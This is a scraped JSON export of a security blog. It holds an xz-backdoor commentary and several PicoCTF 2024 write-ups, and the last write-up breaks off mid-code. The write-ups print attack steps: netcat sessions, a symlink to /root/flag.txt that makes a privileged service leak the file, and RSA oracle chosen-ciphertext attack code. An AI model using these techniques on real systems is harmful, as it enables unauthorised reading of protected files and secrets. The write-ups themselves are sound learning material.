
[{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/tags/open-source/","section":"Tags","summary":"","title":"Open Source","type":"tags"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/tags/security/","section":"Tags","summary":"","title":"Security","type":"tags"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/","section":"sudo rem","summary":"","title":"sudo rem","type":"page"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"There\u0026rsquo;s a lot of information floating around right now on the xz backdoor. I have very few doubts that over the next few weeks/months, we\u0026rsquo;ll be inundated with commentary regarding how we should\u0026rsquo;ve seen this, how open-source software is a security vulnerability in itself, and that if we simply paid developers more, the solution would magic itself away.\nWhile some of these are true\u0026ndash; notably that open-source software developers generally prop up the backbone of the internet, I\u0026rsquo;d feel remiss if I didn\u0026rsquo;t add some level of commentary on the whole issue from the perspective of someone dealing with the actions and consequences of open source security in general.\nBackground # First, to offer an at-a-glance background of what exactly motivated this article. On March 29, 2024, Andres Freund posted to the OpenWall mailing list that he\u0026rsquo;d found a vulnerability in the xz software. Specifically, a backdoor.\nxz is a common dependency for both sshd and systemd on systems that selectively utilize both of these services, and has a pretty dramatic attack surface. Distributions like Kali/Arch were \u0026ldquo;compromised\u0026rdquo; (though the effects of this compromise are both are incredibly limited and very niche, to the point where there is an incredibly limited threat to end users despite common Internet sentiment.)\nTo avoid rehashing the entirety of the article, the backdoored xz tarball builds liblzma with a bit of code inserted to manipulate the PLT of RSA_public_decrypt to its own function, essentially arbitrarily replacing that code with its own.\nThis has a number of possible consequences, and while I\u0026rsquo;ll avoid speculating publicly, there\u0026rsquo;s a fair bit of research that is pointing to compelling conclusions that this was a backdoor that enabled Remote Code Execution (RCE) via values stored in an attacker\u0026rsquo;s RSA public key.\nThere is a lot of information regarding the author as well; however much of it seems to not be grounded in reality\u0026ndash; and I think Internet conspiracy theorists are having a field day with the current state of this security issue. That said, one thing is for certain, this attack was quite mature, sophisticated, and well thought out.\nIs Open Source Software a Security Risk? # This is the question on everyone\u0026rsquo;s mind right now. When we think of open source software, minds will generally wander to the idea that we\u0026rsquo;re just arbitrarily pulling packages off of Github sight unseen. I\u0026rsquo;m not sure if this is a reality though in most ecosystems, and even in these cases, there are steps we can start to take to defend ourselves. Chiefly, observing the way we maintain open source software itself.\nIt baffles me that a singular maintainer was left in charge of this package, and their commits went more or less entirely unchecked. The wonders of having a team responsible of a large project isn\u0026rsquo;t just that the responsibility is divided; but it is also that you can implement a more robust code review processes in general. This, to me personally, represents the biggest failure in the xz events.\nIn the U.S. military, there is the concept of no-lone zones, and for specific tasks, there is a mandatory two-person requirement. This is to prevent a single individual from ever having access to certain systems or components that are critical to the overall process. This significantly reduces the attack service\u0026ndash; a single compromised individual can never make unilateral changes to something without someone else being aware of it.\nNo-Lone Zone Sign In open source software, I think this guiding principle needs to be embraced as well. The odds of a specific account getting compromised are reasonably high in aggregate, and even if the account isn\u0026rsquo;t, the user may be. So the question that remains in the forefront of my mind is that in projects that prop up major portions of the broader open source community, why are we not examining these with the same level of scrutiny? This compromise could\u0026rsquo;ve had national security impacts; it could\u0026rsquo;ve had impacts on healthcare, government, legal, etc., systems. In fact, there aren\u0026rsquo;t a lot of domains where this backdoor couldn\u0026rsquo;t have impacted. The two-person principle is powerful.\nBut this is difficult to implement too, and has just as many edge cases\u0026ndash; if a single author is compromised, it can be presumed that they are in close working relationships. Would compromising a core maintainers account make it simpler to social engineer your way into compromising co-contributor accounts? Certainly\u0026ndash; if you are masquerading as an individual, you may be able to leverage that familiarity to obtain access to successive accounts. But I wouldn\u0026rsquo;t consider this a failure of the model\u0026ndash; it is still an increase in the defensive posture of open source software, and adds to the collective work factor to perform these kind of compromises.\nOther risks to this model include networks of threat actors; or individuals masquerading on multiple accounts. While there isn\u0026rsquo;t an elegant solution to this\u0026ndash; if we all convert to this model tomorrow, we run the risk of threat actors simply creating new accounts, it isn\u0026rsquo;t hard to look at the network of contributors of a specific project and select \u0026lsquo;vouching authorities\u0026rsquo; for this two-person concept of code security instead of tolerating an entirely new project contributor to perform this action.\nTo kind of realign ourselves with the question I posed, what does this actually mean for open source security though? Certainly we don\u0026rsquo;t have the ability to arbitrarily assign key maintainers, and that may also introduce some concerns itself\u0026ndash; do you trust the person doing the code review? What if that person is unavailable? Do we mandate critical software now have teams dedicated to them to maintain the code? And chiefly, if we\u0026rsquo;re mandating this, it seems like\u0026hellip; pay them as well.\nDefense-In-Depth isn\u0026rsquo;t just network design # There are a few scenarios where this behavior could\u0026rsquo;ve come to be: Was Jia Tan\u0026rsquo;s account compromised? Or even more sinister, were they social engineering people for years to successfully implement this backdoor?\nSomehow, I doubt we\u0026rsquo;re going to get the actual answer to this, but it does bring up an interesting idea. What if they simply didn\u0026rsquo;t have the ability to do this without raising alarms? We preach all the time in the open-source community about contributing to these communities and projects, but what does that actually mean? Well, to me\u0026ndash; contributing is any meaningful progress towards the development of that package. And security is, by its very nature, a requirement of development (in an ideal world). So it\u0026rsquo;s not a farfetched idea that involvement with open source could simply be effectively performing check-and-balance code reviews for project maintainers as well.\nFor instance, commits made by Lasse Collin (the original xz maintainer) highlighted this entertaining change to the Landlock sandbox check, which resulted in the sandbox check actually just simply being disabled.\n--- a/CMakeLists.txt +++ b/CMakeLists.txt @@ -1001,7 +1001,7 @@ if(NOT SANDBOX_FOUND AND ENABLE_SANDBOX MATCHES \u0026#34;^ON$|^landlock$\u0026#34;) #include \u0026lt;linux/landlock.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; -. + void my_sandbox(void) { (void)prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); Can you spot the issue? It\u0026rsquo;s quite subtle, and hard to notice without an acute observation (and maybe some pretext.) The additional character that was removed by Lasse in his cleanup efforts here actually disabled the sandbox check entirely by causing the code to error.\nNow, we can all point the finger at how we should\u0026rsquo;ve caught that, and I\u0026rsquo;m inclined to agree\u0026ndash; we should have. Collectively, the open source software community probably holds some blame for not encouraging (or enforcing, in some cases) the code security review process.\nSo how can we possibly fix this?\nGetting Involved in Security Reviews # I would generally encourage individuals to get involved not only with the development of software in the open source ecosystems, but the security as well. Tools like Semgrep can act as excellent ways to amplify your sphere of influence as an application security professional or cybersecurity-inclined software engineer across a massive amoung of data.\nI\u0026rsquo;ll never pretend to be a developer. My ability to produce code is limited at best, and I have all but a loose syntactic recognition of most languages aside from Java and Python. But what I do know is that I can take a demonstration of a vulnerability, write a Semgrep rule, and apply that knowledge across virtually any codebase that I\u0026rsquo;d be interested in.\nrules: - id: double-free patterns: - pattern-not: | free($VAR); ... $VAR = NULL; ... free($VAR); - pattern-not: | free($VAR); ... $VAR = malloc(...); ... free($VAR); - pattern-inside: | free($VAR); ... $FREE($VAR); - metavariable-pattern: metavariable: $FREE pattern: free - focus-metavariable: $FREE message: \u0026gt;- Variable \u0026#39;$VAR\u0026#39; was freed twice. This can lead to undefined behavior. metadata: cwe: - \u0026#39;CWE-415: Double Free\u0026#39; owasp: - A03:2021 - Injection - A01:2017 - Injection references: - https://cwe.mitre.org/data/definitions/415.html - https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory category: security technology: - c confidence: LOW subcategory: - vuln likelihood: LOW impact: HIGH languages: [c] severity: ERROR Semgrep rule detecting double-free vulnerabilities in C Is this going to find binary malware? No\u0026ndash; we\u0026rsquo;ve got YARA for that (and in this case it wouldn\u0026rsquo;t have done a whole lot), but we it isn\u0026rsquo;t an extreme leap to look at the current code and go \u0026ldquo;Well, wait, we could\u0026rsquo;ve prevented some of this.\u0026rdquo; And that\u0026rsquo;s where I rest my entire argument. We have the tools to start looking at open source security more critically than we currently do, and to exert professional knowledge across numerous domains.\nVipyr\u0026rsquo;s Dragonfly framework currently processes about 9000 lines of code per second, with the ability to sustain that almost indefinitely. I don\u0026rsquo;t believe in earnest that the open-source software that most individuals are using are sustaining that level of upstream activity for any sustained period of time. Consequentially, I know this to be an accomplishable task. While it\u0026rsquo;s difficult, it is certainly possible.\nAs such, if you\u0026rsquo;re a security professional and open source security enthusiast, a wonderful opportunity for you to get involved is to write rules to detect behaviors such as this; and to embrace wholesale the idea that security contributions to the broader open-source ecosystem can actually be in the form of aggregate detection instead of raw Hey your authentication here isn\u0026rsquo;t working! (Though both aren\u0026rsquo;t bad either!)\nCombinatorial Explosion: A Dependency Issue # One of the common \u0026lsquo;stabs\u0026rsquo; towards this issue I\u0026rsquo;ve seen in various discussions on social media is that as a developer, it\u0026rsquo;s your responsibility to review dependencies prior to accepting them into your codebase. I find this a little reductionist for a couple of reasons.\nI\u0026rsquo;ve done at least enough development to understand how much of a pain it is to maintain dependencies. About seven months ago, I started development on the Vipyr Security website. It\u0026rsquo;s a simple Astro site using onWidget\u0026rsquo;s AstroWinds template. Our site itself doesn\u0026rsquo;t have a whole lot in the way of functionality, and it\u0026rsquo;s largely just the world\u0026rsquo;s most overengineered static site. How many dependencies do you think it takes to generate the seven or eight pages we have on our website? 10? 100? 500?\nAt one point, our SBOM (Software Bill of Materials) was over nine-hundred npm packages.\nI do not care how big your development team is, you cannot possibly secure this yourself. Resultant to that, at some point, you\u0026rsquo;re accepting some arbitrary code entry into your codebase. So\u0026hellip; how do we secure this?\nThe answer: You probably can\u0026rsquo;t. At least, not in the way you\u0026rsquo;re thinking of. It seems reasonable to me to review new introductions into your SBOM itself; I would like to know when I have a new package added or removed from my dependency list. And I will and brief myself on changes to this overview of my code composition. But I cannot possibly dictate the level of time it might take to review any changes to these dependencies themselves.\nEnter Software Composition Analyis (SCA) # What a fancy term for something so idiomatic\u0026hellip; We spoke briefly about the idea of dedicating teams of maintainers and security reviewers to prevent a single compromise from tainting the supply chain? What if we could assign these codebases some sort of reputation score, identify projects that might be vulnerable in this regard, and suggest alternatives? That\u0026rsquo;s where Software Composition Analysis comes in.\nIf we take aggregate threat information from various feeds such as Github Security Advisories (GHSA), Common Vulnerabilities and Exploits (CVE) and static application security testing (SAST) solutions like Semgrep, Snyk, etc., and we apply them across our entire SBOM, we kind of arrive at a very simple SCA system.\nIf we track the flow of potentially untrusted code entering our source code and the various means in which it\u0026rsquo;s being added, we can start to build out a threatmap of sourcecode that might be more or less secure, and prioritize our review efforts towards these sources. This makes the dependency issue a bit more digestable. Instead of reviewing 900 packages, I can now trust that Snyk probably did due dilligence in scanning (or at least, a better job than I\u0026rsquo;ll do) on a large portion of these packages, and focus myself on packages that have not yet reached maturity that may be introduced into my codebase, or packages with lower maintainer reputation scores, etc., as my threat model dictates.\nAnd likewise, this gives an opportunity for SAST tools and open source software security organizations to provide their services to the community at large. I would love to be able to communicate our findings to the broad community regarding specific package trust levels\u0026ndash; I can\u0026rsquo;t ensure the security of any given software, but I can certainly say \u0026ldquo;Hey guys, we looked at this and didn\u0026rsquo;t find anything.\u0026rdquo; And depending on your risk tolerance, that might be the golden stamp that you need to have a level of trust in some new package.\nSCA accomplishes all of this concisely, and while it\u0026rsquo;s relatively new in the grand scheme of the software supply chain, the concept of attestation isn\u0026rsquo;t. It\u0026rsquo;s still immature in its adoption in many ecosystems, the Open Source Security Foundation continues to make strides towards implementing attestation across a variety of domains. I realize I haven\u0026rsquo;t explain what attestation was (directly) but I\u0026rsquo;ve actually been referring to this the entire time.\nIf we start associating specific build processes, security processes, etc., with a cryptographically sound method of proving that something exists as it purports, e.g., \u0026ldquo;This was built by Github Actions with the following commit,\u0026rdquo; then our trust level can increase in the open source ecosystem substantially. And if we start examining these artifacts when we are developing and implementing open source software, we start to build a network of trust and security that is very difficult to circumvent.\nConclusion # I wrote a lot here\u0026ndash; this is a complex issue with a lot of valid solutions. OSS security remains in the limelight almost constantly, with vulnerabilities abound and threat actors incredibly active in their efforts to taint the software supply chain. But we\u0026rsquo;re not without answers.\nSecurity professionals and software developers alike can increase involvement in the open source ecosystems not only through direct pull requests and code reviews, but contributions through code security engines.\nAnd we\u0026rsquo;re not without answers in managing these dependencies as well, which is certainly in the forefront of everyone\u0026rsquo;s mind. Software Composition Analysis can turn an extensive Software Bill of Materials into managable aggregate data that can then be actioned more concisely and with more concentrated effort than trying to do the impossible task of reviewing every piece of code entering and leaving large projects.\nOne thing is for certain\u0026ndash; the xz backdoor highlights a number of processes that we can improve on in OSS security.\n","date":"31 March 2024","externalUrl":null,"permalink":"/posts/xz-backdoor/","section":"Posts","summary":"There\u0026rsquo;s a lot of information floating around right now on the xz backdoor.","title":"The XZ Backdoor Dilemma","type":"posts"},{"content":"","date":"26 March 2024","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"26 March 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"26 March 2024","externalUrl":null,"permalink":"/tags/general/","section":"Tags","summary":"","title":"General","type":"tags"},{"content":"","date":"26 March 2024","externalUrl":null,"permalink":"/tags/pico/","section":"Tags","summary":"","title":"Pico","type":"tags"},{"content":" Introduction # C3 (Custom Cyclical Cipher) was a challenge in the Cryptography category of PicoCTF 2024. Given a plain ciphertext and the code used to produce it, players were given the broad vector of reversing the ciphertext back to plaintext.\nAs far as hints go, C3 didn\u0026rsquo;t offer much in the way of solving, but mused that \u0026ldquo;Modern crypto schemes don\u0026rsquo;t depend on the encoder to be secret, but this one does.\u0026rdquo;\nSolving # This is a relatively straightforward solve, but it actually took me a bit to get to the bottom of the solution for reasons we\u0026rsquo;ll discuss in a bit.\nThe Ciphertext # DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl We\u0026rsquo;re given the above ciphertext. There\u0026rsquo;s nothing incredibly alarming here. We can see that there\u0026rsquo;s no digits present in the ciphertext itself, nor any nonprintable characters, so of the assumptions we can draw thus far, we can fairly confidently say that this is going to use a pretty limited character set.\nWhen approaching ciphertexts, it\u0026rsquo;s always a good idea to keep in mind the character frequency. In this case, we have several characters that appear more frequently than others. A (26), F(24) followed by D(14), B(12) and so on down the list.\nThis doesn\u0026rsquo;t end up being particularly relevant to this challenge, but a good habit to make is to start looking early for obvious patterns that might match up to the English language. For instance, E is the most common letter in the English language, and as such, we might assume that A decodes to E. I can save you some effort and confirm that it does not.\nThe Cipher # chars = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; lookup1 = \u0026#34;\\n \\\u0026#34;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz\u0026#34; lookup2 = \u0026#34;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst\u0026#34; out = \u0026#34;\u0026#34; prev = 0 for char in chars: cur = lookup1.index(char) out += lookup2[(cur - prev) % 40] prev = cur sys.stdout.write(out) I\u0026rsquo;ve adjusted the above for Python 3. So we can see we have, as the challenge suggested, a cyclical cipher that will do the following.\nWe will look for the character in lookup 1. We will take the index of that character, subtract the previous index, and then use modulo % to \u0026lsquo;wrap\u0026rsquo; it within the array. (The array\u0026rsquo;s length is 40.) We will then store the current character\u0026rsquo;s index as previous, and repeat. The Solve # Since variable previous is equal to zero on the first iteration, we have all the information we need to work back through the ciphertext and derive the cleartext. I wrote a simple Python script to do this.\nlookup1 = \u0026#34;\\n \\\u0026#34;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz\u0026#34; lookup2 = \u0026#34;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst\u0026#34; with open(\u0026#39;ciphertext\u0026#39;,\u0026#39;r\u0026#39;) as f: ciphertext = f.read() prev = 0 out=\u0026#34;\u0026#34; for letter in ciphertext: ind = lookup2.index(letter) for x in range(100000): if (x - prev) % 40 == ind: out += lookup1[x] prev = x break print(out) We create both lookup tables again, and read the file for convenience sake. And then we get to solving\u0026hellip;\nWe reference the letter of the ciphertext, and obtain its index. We then loop over an unnecessarily large range, which easily could\u0026rsquo;ve been much smaller but for the sake of simplicity, was arbitrarily chosen to be high. This is because we want to afford previous the ability to be larger than current, in order for it to \u0026lsquo;wrap\u0026rsquo; with the modulo operator. When we find a value minus the previous value, modulus 40 equal to the index of the current letter, we can confirm that that is our previous index. We can now add that to our output string, and then set our previous equal to the x that we just found. We now simply need to run this script on the ciphertext and we obtain our cleartext:\n#asciiorder #fortychars #selfinput #pythontwo chars = \u0026#34;\u0026#34; from fileinput import input for line in input(): chars += line b = 1 / 1 for i in range(len(chars)): if i == b * b * b: print chars[i] #prints b += 1 / 1 Now, I got stuck here for quite awhile. I took the steps to convert this to Python 3 from Python 2 before carrying on\u0026hellip;\nwith open(\u0026#39;original.py\u0026#39;) as f: ciphertext = f.read() asciichars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn\u0026#34; b = 1 for i in range(len(ciphertext)): if i == b*b*b: print(ciphertext[i]) b += 1 #selfinput is the big hint here, and ultimately what got us to the end of the challenge. I fed the cleartext that we reversed from step 1 into the remade Python3 script, and I was able to obtain the flag. picoCTF{adlibs}\nFor clarity, this steps over each character in the original script, and if its index is equal to 1^3, 2^3, 3^3, \u0026hellip; it will add the character to the output string.\nSummary # Relying on the obfuscation of a cipher does not always guarantee any level of security of the ciphertext, and with a bit of Python knowhow, we found that we were able to rapidly derive the plaintext and flag for this specific challenge.\n","date":"26 March 2024","externalUrl":null,"permalink":"/posts/pico24-c3/","section":"Posts","summary":"Working through security by obscurity with the PicoCTF 2024 C3 challenge.","title":"Pico CTF 24 - C3","type":"posts"},{"content":" Introduction # dont-you-love-banners was a challenge in PicoCTF 2024. The challenge was classified as General Skills, and was quit straightforward, despite having quite a bit of chatter in the PicoCTF Discord.\nThe description tells us that there is a server leaking \u0026ldquo;crucial information\u0026rdquo; on one port, and then a an application running on another port on the same machine. IT also lets us know that the flag is in /root. We\u0026rsquo;re given two hints here, one advises a small amount of password cracking or guessing, and the other asks about symlink.\nSolving # The Leaky Machine # So we\u0026rsquo;re going to start by exploring the leaked information from the initial server by netcatting that host and port. While the challenge does not specify this directly, given that we\u0026rsquo;ve got some prerequisite information about banners, I figured this would be a good starting point. And I was very correct, this is serving a banner with a password in it.\n┌──(rem λ redmint)-[~] └─$ nc tethys.picoctf.net 58837 SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234 The Exploit # So now we have a password, we can see what it goes to. We\u0026rsquo;re going to step through a bit of question and answer, and the results were fairly trivial to google.\n┌──(rem λ redmint)-[~] └─$ nc tethys.picoctf.net 63259 ************************************* **************WELCOME**************** ************************************* what is the password? My_Passw@rd_@1234 What is the top cyber security conference in the world? DEFCON the first hacker ever was known for phreaking(making free phone calls), who was it? John Draper player@challenge:~$ ls ls banner text Now we have a shell. I started by catting out banner and text, to see where I\u0026rsquo;m at and what I\u0026rsquo;m dealing with.\nplayer@challenge:~$ cat banner ************************************* **************WELCOME**************** ************************************* player@challenge:~$ cat text keep digging We can see that the banner we saw when netcatting onto the machine is in a text document. This will become important later!\nFor now, let\u0026rsquo;s go visit the flag and see if we can cat it out.\nplayer@challenge:~$ cd /root player@challenge:/root$ ls flag.txt script.py player@challenge:/root$ cat flag.txt cat: flag.txt: Permission denied Not quite that easy. However, our hints do give us a good launching point, which is that a symlink might be the key here. We can try to symlink the flag to take the place of the banner, and see if it\u0026rsquo;s being read by something with a higher privilege level.\nplayer@challenge:/root$ ln -s /root/flag.txt ~/banner ln -s /root/flag.txt ~/banner ln: failed to create symbolic link \u0026#39;/home/player/banner\u0026#39;: File exists player@challenge:/root$ rm ~/banner rm ~/banner player@challenge:/root$ ln -s /root/flag.txt ~/banner ln -s /root/flag.txt ~/banner player@challenge:/root$ cd ~ player@challenge:~$ cat banner cat: banner: Permission denied We still can\u0026rsquo;t cat this banner out, but it was served when we connected before, so what if we simply disconnect and reconnect?\n┌──(rem λ redmint)-[~] └─$ nc tethys.picoctf.net 63259 picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0} what is the password? Flag obtained. I didn\u0026rsquo;t spend too much time looking into this challenge, but I believe the initial interaction on port 63259 was through a Python application which dropped us into a shell. The Python application was reading the contents of banner from the home directory of that user. As such, it can be assumed that the Python program had elevated privileges to read the file we symlinked. So even though we couldn\u0026rsquo;t read it, the Python application dropping us into the shell could, and reconnecting just spit it back out at us.\nSummary # Fairly easy challenge, but worth a large sum of points. A good exercise in symlinks and understanding privileges associated with files in Linux. I believe this was one of the first challenges I solved in Pico 2024, and I\u0026rsquo;m quite glad I went down the road I did right away, as I can see a world where people were scratching their heads looking for privesc or a more stable shell given the first hint of light password cracking.\n","date":"26 March 2024","externalUrl":null,"permalink":"/posts/pico24-banners/","section":"Posts","summary":"Abusing symlinks to include and subsequently display arbitrary textfiles in place of standard SSH banners.","title":"Pico CTF 24 - dont-you-love-banners","type":"posts"},{"content":" Introduction # rsa_oracle was a challenge in PicoCTF 2024 in the cryptography category. As the name suggests, you are challenged with abusing an rsa oracle to decode a password and decrypt a ciphertext.\nThe password is encoded with the private key and the oracle will not decrypt the password. The ciphertext is AES encrypted, and the password contains the key to that file.\nWe\u0026rsquo;re given a few hints here before starting:\nCryptography Threat models: chosen plaintext attack. OpenSSL can be used to decrypt the message. e.g. openssl enc -aes-256-cbc -d ... The key to getting the flag is by sending a custom message to the server by taking advantage of the RSA encryption algorithm. Minimum requirements for a useful cryptosystem is CPA security. Let\u0026rsquo;s unpack these a bit. We\u0026rsquo;re actually just handed our attack vector here, a chosen plaintext attack on the RSA oracle. We also know that the ciphertext is encrypted with AES-256 in CBC mode. Not wildly useful, but saves us some steps at the end. We also know that we need to send a message to the oracle to derive some information about the RSA algorithm.\nSolving # Research # RSA encryption is very public and well published. With a little bit of research, we can determine the following: Given a Message M, Ciphertext C is determined by: C = M^e mod N I am not a math guy. I will never claim to be. So there\u0026rsquo;s a lot going on here that I really do not understand. Fortunately, we can actually just kinda\u0026hellip; c = pow(m, e, n) Oh, that\u0026rsquo;s Python, and it\u0026rsquo;s very easy. As with all things in Math, these have some specific names. Specifically, e is the public exponent, and n is the modulus. It is typically an enormously long (2048 bit) prime number, derived from multiplying two smaller prime numbers together.\nThrough my research, I also found out that a common public exponent is used, 65537. So with all that in hand, we actually have enough to solve this now.\nCracking RSA # So when we interact with the oracle, we\u0026rsquo;re able to encrypt and decrypt data. When we encrypt data, we send the hex value of the character(s) we sent to the oracle.\n┌──(rem λ redmint)-[~/CTF/Pico/rsa oracle] └─$ nc titan.picoctf.net 62026 ***************************************** ****************THE ORACLE*************** ***************************************** what should we do for you? E --\u0026gt; encrypt D --\u0026gt; decrypt. e enter text to encrypt (encoded length must be less than keysize): 1 1 encoded cleartext as Hex m: 31 ciphertext (m ^ e mod n) 4374671741411819653095065203638363839705760144524191633605358134684143978321095859047126585649272872908765432040943055399247499744070371810470682366100689 We can actually just start to plug in some information here. M is our message, in this case we sent 1, which is 0x31. That value was raised to the public exponent, and we\u0026rsquo;re going to start with 65537 here.\nWe can always check our assumptions when we derive an N value by using the formula pow(m, e, n) and our target here is the n value, for a step we\u0026rsquo;ll use later. I found a snippet of code to simplify this.\ndef recover_n(pairings, e): pt1, ct1 = pairings[0] N = ct1 - pow(pt1, e) # loop through and find common divisors for pt,ct in pairings: val = gmpy2.mpz(ct - pow(pt, e)) N = gmpy2.gcd(val, N) return N The above function has been slightly modified for brevity, but the original function, found online, took multiple pairings to ensure a discrete value was being obtained. If we pass in our pairing, which is our plaintext 0x30 and the ciphertext we received, we can derive the modulus with that formula.\nRSA encryption is based on modular exponentiation, which involves raising a plaintext message to a certain power (the public exponent) and then taking the remainder when divided by a large modulus.\nThe provided function aims to recover this modulus by exploiting a property of RSA encryption. When a plaintext message is encrypted using RSA, the difference between the ciphertext and the plaintext raised to the power of the public exponent shares a common factor with the modulus.\nThe function takes pairs of plaintext and ciphertext values and calculates this difference for each pair. By finding the greatest common divisor (GCD) among these differences, the function effectively identifies a factor of the modulus. Since the modulus is the product of two prime numbers, finding just one factor is enough to reveal the modulus itself.\nSo with that information in hand (and some writing liberties from ChatGPT to explain this better than I think I attempted to the first few times I wrote this) we should be able to derive the modulus N.\nAnd we can! Our program gives us 5507598452...! And if we want to cross check our math, we can go ahead and just\u0026hellip;\npow(0x30, 65537, 5507598452356422225755194020880876452588463543445995226287547479009566151786764261801368190219042978883834809435145954028371516656752643743433517325277971) \u0026gt;\u0026gt;\u0026gt; 4374671741411819653095065203638363839705760144524191633605358134684143978321095859047126585649272872908765432040943055399247499744070371810470682366100689 And that is our original ciphertext! Alright so, what do we actually do with this? Well, I found a nice little Github repository called RSHack which contains a particularly useful tool for us. However, it\u0026rsquo;s about 7 years old, so it didn\u0026rsquo;t quite work out of the box.\n# RSA Chosen Plaintext Attack # Zweisamkeit - zweisamkeit.fr # 07/05/17 # GNU GPL v3 import codecs class Chopla(object): def __init__(self, n, e, c): c_bis = c * pow(2,e,n) % n print(\u0026#34;\\t[*] Please send the following ciphertext to the server: {}\\n\u0026#34;.format(c_bis)) out = int(input(\u0026#34;\\t[*] What\u0026#39;s the result? \u0026#34;)) p = out // 2 print(\u0026#34;\\t[+] The plaintext is: {}\\n\u0026#34;.format(p)) try: p_text = codecs.decode(hex(p)[2:].replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;), \u0026#34;hex_codec\u0026#34;).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;\\n\\t[+] The interpreted plaintext: {}\\n\u0026#34;.format(p_text)) except: print(\u0026#34;\\t[-] The plaintext is not interpretable\\n\u0026#34;) We see some very familiar variables here. We can pass the public exponent, modulus, and ciphertext to Zweisamkeit\u0026rsquo;s RSHack with this module. Since we have all the information from how a ciphertext is generated, we can actually just step through here with given values. If we pass in a value of 2 instead of our ciphertext in the RSA formula, we can factor out the ciphertext contents later by sending a custom message that will result in the ciphertext simply being multiplied by two. We then divide that by two, and we\u0026rsquo;re given our plaintext.\nPlugging in our information, we are given a message to send to the rsa oracle. When we receive our response, we need to pass back the base 10 or decimal converted value back to RSHack.\n[*] Please send the following ciphertext to the server: 241054478552663348609287639876876182397364722944 [*] What\u0026#39;s the result? 491317127782 [+] The plaintext is: 245658563891 [+] The interpreted plaintext: 92d53 We can then use this plaintext key to decrypt our file.\n┌──(rem λ redmint)-[~/CTF/Pico/rsa oracle] └─$ openssl enc -aes-256-cbc -d -in secret.enc enter AES-256-CBC decryption password: *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. picoCTF{su((3ss_(r@ck1ng_r3@_92d53250} Summary # There\u0026rsquo;s still a lot of math I don\u0026rsquo;t really understand about RSA. But it\u0026rsquo;s old, and it\u0026rsquo;s well documented enough that stumbling blindly through it can often produce the intended results. I think in the event that my initial public exponent hadn\u0026rsquo;t worked, I probably would\u0026rsquo;ve beat the server up a bit with some public exponent values, and maybe rewrap RSHack and the modulus derivation formulas into a script with Pwntools to automate the entire process.\nEven writing this article has taught me a little bit as I check assumptions, and dig a bit more into the code that was previously just a means to an end.\n","date":"26 March 2024","externalUrl":null,"permalink":"/posts/pico24-rsa-oracle/","section":"Posts","summary":"Implementing a known plaintext attack utilizing an RSA oracle.","title":"Pico CTF 24 - rsa_oracle","type":"posts"},{"content":" Introduction # weirdSnake was a challenge in PicoCTF 2024 in the reverse engineering category. The broad vector is that given a the disassembled output of Python code, you must reverse the code back to the original to derive the flag.\nAs such, the file we\u0026rsquo;re given is a (fairly large) Python disassembly text document.\nSolving # There\u0026rsquo;s no particularly strong way to solve this programmatically aside from having a reasonable understanding of the Python interpreter and how Python code looks when disassembled. And so, we\u0026rsquo;ll find ourselves delving into the source code by fragments to try and replicate their behaviors.\nFor brevity and to save some horizontal space, the first 42 lines involve creating a simple list.\n1 0 LOAD_CONST 0 (4) ... 78 LOAD_CONST 30 (78) 80 BUILD_LIST 40 82 STORE_NAME 0 (input_list) This gives us the following list:\ninput_list = [4, 54, 41, 0, 112, 32, 25, 49, 33, 3, 0, 0, 57, 32, 108, 23, 48, 4, 9, 70, 7, 110, 36, 8, 108, 7, 49, 10, 4, 86, 43, 108, 112, 14, 2, 71, 62, 115, 88, 78] Proceeding through the program we\u0026rsquo;ll go ahead and dump the following bit of stringbuilding here and discuss it, as this is where I hit my first hiccup.\n2 84 LOAD_CONST 31 (\u0026#39;J\u0026#39;) 86 STORE_NAME 1 (key_str) 3 88 LOAD_CONST 32 (\u0026#39;_\u0026#39;) 90 LOAD_NAME 1 (key_str) 92 BINARY_ADD 94 STORE_NAME 1 (key_str) 4 96 LOAD_NAME 1 (key_str) 98 LOAD_CONST 33 (\u0026#39;o\u0026#39;) 100 BINARY_ADD 102 STORE_NAME 1 (key_str) 5 104 LOAD_NAME 1 (key_str) 106 LOAD_CONST 34 (\u0026#39;3\u0026#39;) 108 BINARY_ADD 110 STORE_NAME 1 (key_str) 6 112 LOAD_CONST 35 (\u0026#39;t\u0026#39;) 114 LOAD_NAME 1 (key_str) 116 BINARY_ADD 118 STORE_NAME 1 (key_str) An important thing to observe here is the order of operations, as this will end up being our XOR key, and the string is not as simple as adding up the characters in order. One would expect that to look something like J_o3t, but the order of operations is a bit different than it initially appears.\nkey_str = \u0026#34;J\u0026#34; key_str = \u0026#34;_\u0026#34; + key_str # Note the order these are loaded in. We are now at \u0026#34;_J\u0026#34; key_str = key_str + 